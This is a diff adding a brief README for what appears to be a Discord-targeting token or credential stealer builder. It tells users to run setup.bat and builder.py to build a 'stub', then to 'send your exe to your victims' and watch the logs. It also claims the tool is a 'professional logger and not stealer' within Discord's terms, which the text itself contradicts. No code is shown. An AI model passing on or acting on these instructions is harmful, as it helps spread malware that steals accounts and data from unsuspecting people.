@@ -1,0 +1,5 @@
+run setup.bat and then run builder.py to start building your stub
+
+send your exe to your victims and start looking at your logs!
+
+i will continue to keep adding more and more features in the future but this will never be against discord ToS as this is a professional logger and not "stealer"
